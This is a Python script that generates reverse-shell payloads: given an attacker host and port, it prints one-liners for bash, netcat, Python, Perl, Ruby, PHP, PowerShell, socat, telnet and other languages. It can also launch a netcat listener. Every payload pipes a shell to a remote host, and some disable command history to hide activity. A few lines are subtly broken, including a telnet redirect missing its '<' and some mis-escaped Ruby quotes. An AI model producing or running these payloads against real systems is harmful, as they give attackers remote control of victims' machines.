#!/usr/bin/python

import os
import argparse
from colorama import *

parser = argparse.ArgumentParser()
parser.add_argument("host", type=str, help="ip address of target")
parser.add_argument("port", type=str, help="call back port number")
parser.add_argument("-l", "--listener", help="start a netcat listener on the call back port number",
                    action="store_true")

args = parser.parse_args()
LHOST = args.host
LPORT = args.port

#Bash
def bash():
	print('\n' + Style.BRIGHT + Fore.CYAN + '---Bash---' + '\n' + Style.RESET_ALL)
	print("""bash -i >& /dev/tcp/""" + LHOST + '/' + LPORT + """ 0>&1""")
	print(Style.BRIGHT + Fore.MAGENTA + '*' + Style.RESET_ALL)
	print("""0<&196;exec 196<>/dev/tcp/""" + LHOST + '/' + LPORT + """; sh <&196 >&196 2>&196""")
	print(Style.BRIGHT + Fore.MAGENTA + '*' + Style.RESET_ALL)
	print("""exec 5<>/dev/tcp/""" + LHOST + '/' + LPORT + """ && while read line 0<&5; do $line 2>&5 >&5; done""")

#Netcat
def netcat():
	print('\n' + Style.BRIGHT + Fore.CYAN + '---Netcat---' + '\n' + Style.RESET_ALL)
	print("""nc -e /bin/sh """ + LHOST + ' ' + LPORT)
	print(Style.BRIGHT + Fore.MAGENTA + '*' + Style.RESET_ALL)
	print("""/bin/sh | nc """ + LHOST + ' ' + LPORT)
	print(Style.BRIGHT + Fore.MAGENTA + '*' + Style.RESET_ALL)
	print("""rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc """ + LHOST + ' ' + LPORT + """ >/tmp/f""")
	print(Style.BRIGHT + Fore.MAGENTA + '*' + Style.RESET_ALL)
	print("""rm -f backpipe; mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc """ + LHOST + ' ' + LPORT + """ 1>/tmp/backpipe""")
	print(Style.BRIGHT + Fore.MAGENTA + '*' + Style.RESET_ALL)
	print("""rm -f backpipe; mknod /tmp/backpipe p && nc """ + LHOST + ' ' + LPORT + """ 0<backpipe | /bin/bash 1>backpipe""")

#Python
def python():
	print('\n' + Style.BRIGHT + Fore.CYAN + '---Python---' + '\n' + Style.RESET_ALL)
	print("python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{0}\",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\'".format(LHOST, LPORT))
	print(Style.BRIGHT + Fore.MAGENTA + '*' + Style.RESET_ALL)
	print("#TCP python -c \"import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'{0}\',{1}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(\'HISTFILE\',\'/dev/null\');pty.spawn([\'/bin/bash\',\'-i\']);s.close();exit();\"".format(LHOST, LPORT))
	print(Style.BRIGHT + Fore.MAGENTA + '*' + Style.RESET_ALL)
	print("#STCP python -c \"import os,pty,socket,sctp;s=sctp.sctpsocket_tcp(socket.AF_INET);s.connect((\'{0}\',{1}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(\'HISTFILE\',\'/dev/null\');pty.spawn([\'/bin/bash\',\'-i\']);s.close();exit();\"".format(LHOST, LPORT))
	print(Style.BRIGHT + Fore.MAGENTA + '*' + Style.RESET_ALL)
	print("#UDP python -c \"import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect((\'{0}\',{1}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(\'HISTFILE\',\'/dev/null\');pty.spawn([\'/bin/bash\',\'-i\']);s.close();\"".format(LHOST, LPORT))

#Perl
def perl():
	print('\n' + Style.BRIGHT + Fore.CYAN + '---Perl---' + '\n' + Style.RESET_ALL)
	print("perl -e 'use Socket;$i=" + "\"" + LHOST + "\"" + ";$p=" + LPORT + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};\'")
	print(Style.BRIGHT + Fore.MAGENTA + '*' + Style.RESET_ALL)
	print("perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"" + LPORT + ':' + LHOST +"\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'")
	print(Style.BRIGHT + Fore.MAGENTA + '*' + Style.RESET_ALL)
	print("#Windows perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"" + LPORT + ":" + LHOST + "\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'")

#Ruby
def ruby():
	print('\n' + Style.BRIGHT + Fore.CYAN + '---Ruby---' + '\n' + Style.RESET_ALL)
	print("ruby -rsocket -e 'f=TCPSocket.open(\"" + LHOST + "\"," + LPORT + ").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'")
	print(Style.BRIGHT + Fore.MAGENTA + '*' + Style.RESET_ALL)
	print("ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"" + LHOST + "\",\"" + LPORT + "\");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'")
	print(Style.BRIGHT + Fore.MAGENTA + '*' + Style.RESET_ALL)
	print("ruby -rsocket -e 'c=TCPSocket.new(\"" + LHOST + "\",\"" + LPORT + "\");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'")

#PHP
def php():
	print('\n' + Style.BRIGHT + Fore.CYAN + '---PHP---' + '\n' + Style.RESET_ALL)
	print("php -r '$sock=fsockopen(\"" + LHOST + "\"," + LPORT + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
	print(Style.BRIGHT + Fore.MAGENTA + '*' + Style.RESET_ALL)
	print("php -r '$sock=fsockopen(\"" + LHOST + "\"," + LPORT + ");shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
	print(Style.BRIGHT + Fore.MAGENTA + '*' + Style.RESET_ALL)
	print("php -r '$sock=fsockopen(\"" + LHOST + "\"," + LPORT + ");`/bin/sh -i <&3 >&3 2>&3`;'")
	print(Style.BRIGHT + Fore.MAGENTA + '*' + Style.RESET_ALL)
	print("php -r '$sock=fsockopen(\"" + LHOST + "\"," + LPORT + ");system(\"/bin/sh -i <&3 >&3 2>&3\");'")
	print(Style.BRIGHT + Fore.MAGENTA + '*' + Style.RESET_ALL)
	print("php -r '$sock=fsockopen(\"" + LHOST + "\"," + LPORT + ");popen(\"/bin/sh -i <&3 >&3 2>&3\", \"r\");'")

#Awk
def awk():
	print('\n' + Style.BRIGHT + Fore.CYAN + '---Awk---' + '\n' + Style.RESET_ALL)
	print("awk 'BEGIN {s = \"/inet/tcp/0/" + LHOST + "/" + LPORT + "\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null")

#Powershell
def powershell():
	print('\n' + Style.BRIGHT + Fore.CYAN + '---Powershell---' + '\n' + Style.RESET_ALL)
	print("$client = New-Object System.Net.Sockets.TCPClient(\'" + LHOST + "\'," + LPORT + "); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close();")

#Javascript
def javascript():
	print('\n' + Style.BRIGHT + Fore.CYAN + '---Javascript---' + '\n' + Style.RESET_ALL)
	print("(function(){ var net = require(\"net\"), cp = require(\"child_process\"), sh = cp.spawn(\"/bin/sh\", []); var client = new net.Socket(); client.connect(" + LPORT + ", \"" + LHOST + "\", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })();")

#Java
def java():
	print('\n' + Style.BRIGHT + Fore.CYAN + '---Java---' + '\n' + Style.RESET_ALL)
	print("r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/" + LHOST + "/" + LPORT + ";cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[]); p.waitFor()")

#Socat
def socat():
	print('\n' + Style.BRIGHT + Fore.CYAN + '---Socat---' + '\n' + Style.RESET_ALL)
	print("socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:" + LHOST + ":" + LPORT)

#Telnet
def telnet():
	print('\n' + Style.BRIGHT + Fore.CYAN + '---Telnet---' + '\n' + Style.RESET_ALL)
	print("rm -f /tmp/p; mknod /tmp/p p && telnet " + LHOST + ' ' + LPORT + " 0/tmp/p")
	print(Style.BRIGHT + Fore.MAGENTA + '*' + Style.RESET_ALL)
	print("telnet LHOST LPORT | /bin/bash | telnet " + LHOST + " " + LPORT)


bash()
netcat()
python()
perl()
#ruby()
php()
#awk()
powershell()
#javascript()
#java()
socat()
telnet()
if args.listener:
	print('\n')
	os.popen("nc -lvnp " + LPORT)
exit()
